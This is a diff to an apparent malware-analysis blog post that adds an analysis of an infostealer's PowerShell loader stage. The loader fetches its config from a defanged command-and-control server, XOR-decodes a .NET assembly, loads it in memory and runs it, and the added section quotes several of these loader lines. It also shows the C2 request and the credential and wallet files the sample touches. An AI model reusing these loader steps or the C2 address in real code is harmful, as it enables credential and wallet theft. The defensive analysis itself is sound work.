@@ -108,7 +108,7 @@ Remove-Item $PSCommandPath -Force
 
 ```
 
-The script checks the .NET version of the victim host, the outcome of which decides which script will be executed.
+The main takeaway from this is that the script checks the .NET version of the victim host, the outcome of which decides which script will be executed.
 
 Next stage:
 
@@ -131,5 +131,54 @@ $ep = $sm.EntryPoint
 
 $ep.Invoke($null, (, [string[]] ($config[1], $config[2], $config[3])))
 ```
+The following actions are performed by the script:
+
+[-] Retrieves the MachineGuid from the Windows registry: $guid = (Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid
+
+[-] Retrieves 3 values from 'hxxp[://]45.129.199[.]204/index.php?id=$guid&subid=ezzcAvVW' and assigns them to the $config array.
+
+[-] Performs a bitwise XOR operation (-bxor) on the binary array with the first value.
+
+[-] Loads the binary data as a .NET assembly using [System.Reflection.Assembly]::Load($binary).
+
+[-] Accessing the entry point of the loaded assembly: $ep = $sm.EntryPoint.
+
+[-] Invokes the entry point of the assembly with the three values: $ep.Invoke($null, (, [string[]] ($config[1], $config[2], $config[3]))).
+
+The values are as follows:
+
+zpsoJEKDxaCoTLVurobI|ezzcAvVW|hxxp[://]45.129.199[.]204/index.php|
+
+We know that the first value is the XOR key, so we can use this to retrieve the binary from the byte array using CyberChef.
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/50343d38-5655-4491-b786-f72712eb31ee)
+
+The binary can be reviewed in DNSpy as it is a .NET binary, however, it is extremely obfuscated as it has been protected with ConfuserEx.
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/c2fa5c5d-54e7-4874-a240-20168cd6fbc8)
+
+Therefore, we will take the dynamic approach.
+
+To be able to execute this binary without an internet connection, I've hardcoded the config and changed the C2 address to localhost.
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/98544282-3be6-407d-a28b-183801d7e5e8)
+
+Upon execution, we can see POST requests are sent to the hardcoded C2 address
+```
+POST /index.php HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 86407
+Expect: 100-continue
+Connection: Keep-Alive
+```
+
+Investigating with ProcMon we see the file events we would expect from an infostealer, touching files which contain sensitive information such as credentials, and extensions associated with 2FA, password management and crypto wallets.
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/5844ee7d-47ec-405d-a61a-e0f26c1de989)
+
+
+
+
+
 
 
